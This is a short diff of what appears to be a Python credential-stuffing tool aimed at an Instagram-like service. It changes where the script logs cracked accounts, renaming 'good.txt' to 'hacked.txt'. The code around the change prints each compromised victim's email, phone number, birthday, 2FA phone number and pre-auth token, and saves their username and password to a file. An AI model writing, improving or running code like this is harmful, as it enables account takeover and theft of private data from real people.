@@ -76,7 +76,7 @@ if d1mod == "1":
                 print(green_color +" --> Email : "+str(info["updates_response"]["email"]))
                 print(green_color +" --> mobile : "+str(info["updates_response"]["mobile"]))
                 print(green_color +" --> birthday : "+str(info["updates_response"]["birthday"]))
-                with open('good.txt', 'a') as x:
+                with open('hacked.txt', 'a') as x:
                     x.write(user + ':' + password + '\n')
             except:
                 print ("---E----N----D")
@@ -88,7 +88,7 @@ if d1mod == "1":
                 print(green_color +" --> number 2FA : "+str(info["is_sms_two_fa_enabled"]))
                 print(green_color +" --> token 2FA : "+str(info["pre_auth_token"]))
                 print(green_color +" --> number 2FA : "+str(info["phone_number"]))
-                with open('good-2FA.txt', 'a') as x:
+                with open('hacked.txt-2FA.txt', 'a') as x:
                     x.write(user + ':' + password + '\n')
             except:
                 print ("---E----N----D")
